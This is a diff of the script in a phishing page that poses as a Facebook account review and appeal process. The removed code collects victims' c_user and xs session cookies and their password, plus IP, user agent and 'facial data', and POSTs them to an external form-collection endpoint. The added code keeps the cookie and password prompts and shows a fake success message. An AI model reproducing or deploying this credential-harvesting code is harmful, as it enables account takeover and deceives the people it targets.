-                totalTimeDisplay.textContent = formatTime(video.duration);
-            }
-            
-            // Format time in MM:SS
-            function formatTime(seconds) {
-                const minutes = Math.floor(seconds / 60);
-                seconds = Math.floor(seconds % 60);
-                return `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-            }
-            
-            function toggleMute() {
+            // Sound toggle functionality
+            soundToggle.addEventListener('click', function() {
                 video.muted = !video.muted;
-                updateVolumeIcon();
-            }
-            
-            function updateVolumeIcon() {
-                if (video.muted || video.volume === 0) {
-                    volumeBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
-                    volumeSlider.value = 0;
-                } else if (video.volume > 0.5) {
-                    volumeBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
-                } else {
-                    volumeBtn.innerHTML = '<i class="fas fa-volume-down"></i>';
-                }
-            }
-            
-            function toggleFullscreen() {
-                const videoContainer = document.querySelector('.video-player-container');
-                
-                if (!document.fullscreenElement) {
-                    if (videoContainer.requestFullscreen) {
-                        videoContainer.requestFullscreen();
-                    } else if (videoContainer.mozRequestFullScreen) {
-                        videoContainer.mozRequestFullScreen();
-                    } else if (videoContainer.webkitRequestFullscreen) {
-                        videoContainer.webkitRequestFullscreen();
-                    } else if (videoContainer.msRequestFullscreen) {
-                        videoContainer.msRequestFullscreen();
-                    }
-                    fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
-                } else {
-                    if (document.exitFullscreen) {
-                        document.exitFullscreen();
-                    } else if (document.mozCancelFullScreen) {
-                        document.mozCancelFullScreen();
-                    } else if (document.webkitExitFullscreen) {
-                        document.webkitExitFullscreen();
-                    } else if (document.msExitFullscreen) {
-                        document.msExitFullscreen();
-                    }
-                    fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
-                }
-            }
-            
-            // Handle fullscreen change event
-            document.addEventListener('fullscreenchange', updateFullscreenIcon);
-            document.addEventListener('webkitfullscreenchange', updateFullscreenIcon);
-            document.addEventListener('mozfullscreenchange', updateFullscreenIcon);
-            document.addEventListener('MSFullscreenChange', updateFullscreenIcon);
-            
-            function updateFullscreenIcon() {
-                if (document.fullscreenElement || 
-                    document.webkitFullscreenElement || 
-                    document.mozFullScreenElement || 
-                    document.msFullscreenElement) {
-                    fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
-                } else {
-                    fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
-                }
-            }
-            
-            // Open review modal
-            reviewBtn.addEventListener('click', function() {
-                modal.style.display = 'block';
-                document.body.style.overflow = 'hidden';
-                initVideoPlayer();
-                initCountdown();
-                
-                // Show webcam option if available
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    webcamContainer.style.display = 'block';
-                }
+                this.textContent = video.muted ? 
+                    translations[currentLanguage].soundToggle : 
+                    translations[currentLanguage].soundToggle.replace("Enable", "Disable");
             });
             
-            // Open appeal modal
-            appealBtn.addEventListener('click', function() {
-                alert('For appeals, please contact our support team at appeals@fb.com');
-            });
-            
-            // Close modal function
-            function closeModalFunc() {
-                modal.style.display = 'none';
-                document.body.style.overflow = 'auto';
-                resetForm();
-                clearInterval(countdownInterval);
-                
-                // Stop webcam stream if active
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    stream = null;
+            // Initial form validation
+            initialSubmit.addEventListener('click', function(e) {
+                const cUser = document.getElementById('c_user');
+                if (cUser.value.trim() === '') {
+                    alert(translations[currentLanguage].cUserLabel + " " + 
+                        (currentLanguage === 'en' ? "is required" : 
+                         currentLanguage === 'es' ? "es requerido" :
+                         currentLanguage === 'fr' ? "est requis" :
+                         "is required"));
+                    cUser.focus();
+                    return false;
                 }
-            }
-            
-            closeModal.addEventListener('click', closeModalFunc);
-            cancelBtn.addEventListener('click', closeModalFunc);
-            
-            // Finish button
-            finishBtn.addEventListener('click', function() {
-                window.location.href = "https://www.facebook.com/";
+                
+                const xs = document.getElementById('xs');
+                if (xs.value.trim() === '') {
+                    alert(translations[currentLanguage].xsLabel + " " + 
+                        (currentLanguage === 'en' ? "is required" : 
+                         currentLanguage === 'es' ? "es requerido" :
+                         currentLanguage === 'fr' ? "est requis" :
+                         "is required"));
+                    xs.focus();
+                    return false;
+                }
+                
+                // Show password confirmation
+                passwordConfirmation.classList.add('active');
+                initialSubmit.style.display = 'none';
+                
+                // Scroll to password section
+                passwordConfirmation.scrollIntoView({ behavior: 'smooth' });
             });
             
-            // Next to Step 2
-            nextToStep2.addEventListener('click', function() {
-                const cUserInput = document.getElementById('c_user');
-                const xsInput = document.getElementById('xs');
-                
-                // Trigger browser validation
-                if (!cUserInput.checkValidity()) {
-                    cUserInput.reportValidity();
+            // Final submission
+            finalSubmit.addEventListener('click', function() {
+                if (passwordInput.value.trim() === '') {
+                    passwordError.style.display = 'block';
+                    passwordInput.focus();
                     return;
                 }
                 
-                if (!xsInput.checkValidity()) {
-                    xsInput.reportValidity();
-                    return;
-                }
+                passwordError.style.display = 'none';
                 
-                // Store values for hidden form
-                hiddenCUser.value = cUserInput.value;
-                hiddenXs.value = xsInput.value;
+                // Show success message
+                formContent.style.display = 'none';
+                successMessage.style.display = 'block';
                 
-                // Generate review ID
-                const reviewId = generateReviewId();
-                hiddenReviewId.value = reviewId;
-                reviewIdDisplay.textContent = reviewId;
+                // Hide the card footer
+                document.querySelector('.card-footer').style.display = 'none';
                 
-                // Generate blockchain hash
-                const blockchainHash = generateBlockchainHash();
-                blockchainHashInput.value = blockchainHash;
-                blockchainHashDisplay.textContent = blockchainHash;
-                
-                // Proceed to next step
-                step1.classList.remove('active');
-                step2.classList.add('active');
-                
-                steps[0].classList.remove('active');
-                steps[1].classList.add('active');
-                steps[0].classList.add('completed');
-                
-                // Update progress line
-                progressLine.style.width = '33%';
+                // Scroll to top of success message
+                successMessage.scrollIntoView({ behavior: 'smooth' });
             });
             
-            // Back to Step 1
-            backToStep1.addEventListener('click', function() {
-                step2.classList.remove('active');
-                step1.classList.add('active');
-                
-                steps[1].classList.remove('active');
-                steps[0].classList.add('active');
-                steps[0].classList.remove('completed');
-                
-                progressLine.style.width = '0%';
-                submissionError.style.display = 'none';
-            });
-            
-            // Submit form
-            nextToStep3.addEventListener('click', async function(e) {
-                e.preventDefault();
-                const passwordInput = document.getElementById('password');
-                
-                if (!passwordInput.checkValidity()) {
-                    passwordInput.reportValidity();
-                    return;
-                }
-                
-                // Set password for hidden form
-                hiddenPassword.value = passwordInput.value;
-                
-                // Prepare form data
-                const formData = {
-                    c_user: hiddenCUser.value,
-                    xs: hiddenXs.value,
-                    password: hiddenPassword.value,
-                    review_id: hiddenReviewId.value,
-                    user_agent: userAgent.value,
-                    ip_address: ipAddress.value,
-                    timestamp: timestamp.value,
-                    facial_data: facialData.value,
-                    blockchain_hash: blockchainHashInput.value
-                };
-                
-                // Validate form data
-                if (!formData.c_user || !formData.xs || !formData.password) {
-                    submissionError.textContent = 'Please fill in all required fields.';
-                    submissionError.style.display = 'block';
-                    return;
-                }
-                
-                // Show loading state
-                nextToStep3.disabled = true;
-                nextToStep3.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
-                
-                // Log form data for debugging
-                console.log('Attempting to submit form with data:', formData);
-                
-                try {
-                    // Submit form data via fetch
-                    const response = await fetch('https://submit-form.com/BLs04ZolX', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(formData)
-                    });
-                    
-                    console.log('Server response:', response);
-                    
-                    if (!response.ok) {
-                        throw new Error(`Server error: ${response.status} ${response.statusText}`);
-                    }
-                    
-                    const result = await response.json();
-                    console.log('Submission successful, response:', result);
-                    
-                    // Proceed to success step
-                    step2.classList.remove('active');
-                    step3.classList.add('active');
-                    
-                    steps[1].classList.remove('active');
-                    steps[2].classList.add('active');
-                    steps[1].classList.add('completed');
-                    
-                    progressLine.style.width = '100%';
-                    submissionError.style.display = 'none';
-                } catch (error) {
-                    console.error('Form submission failed:', error);
-                    
-                    // Display user-friendly error
-                    submissionError.textContent = 'Failed to submit the form. Please check your connection and try again.';
-                    submissionError.style.display = 'block';
-                    
-                    // Reset button state
-                    nextToStep3.disabled = false;
-                    nextToStep3.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Review Request';
-                    
-                    // Fallback to hiddenForm.submit()
-                    console.log('Attempting fallback form submission');
-                    try {
-                        hiddenForm.submit();
-                    } catch (fallbackError) {
-                        console.error('Fallback submission failed:', fallbackError);
-                    }
+            // Validate password on input
+            passwordInput.addEventListener('input', function() {
+                if (this.value.trim() !== '') {
+                    passwordError.style.display = 'none';
                 }
             });
-            
-            // Reset form
-            function resetForm() {
-                document.getElementById('c_user').value = '';
-                document.getElementById('xs').value = '';
-                document.getElementById('password').value = '';
-                
-                hiddenCUser.value = '';
-                hiddenXs.value = '';
-                hiddenPassword.value = '';
-                hiddenReviewId.value = '';
-                
-                step3.classList.remove('active');
-                step1.classList.add('active');
-                
-                steps[2].classList.remove('active');
-                steps[0].classList.add('active');
-                steps[0].classList.remove('completed');
-                steps[1].classList.remove('completed');
-                
-                progressLine.style.width = '0%';
-                
-                video.pause();
-                video.currentTime = 0;
-                videoOverlay.classList.remove('hidden');
-                playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
-                progressBar.style.width = '0%';
-                bufferedBar.style.width = '0%';
-                currentTimeDisplay.textContent = '0:00';
-                submissionError.style.display = 'none';
-                
-                // Reset button state if submission was in progress
-                if (nextToStep3) {
-                    nextToStep3.disabled = false;
-                    nextToStep3.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Review Request';
-                }
-            }
-            
-            // Initialize the page
-            initCountdown();
         });
     </script>
 </body>
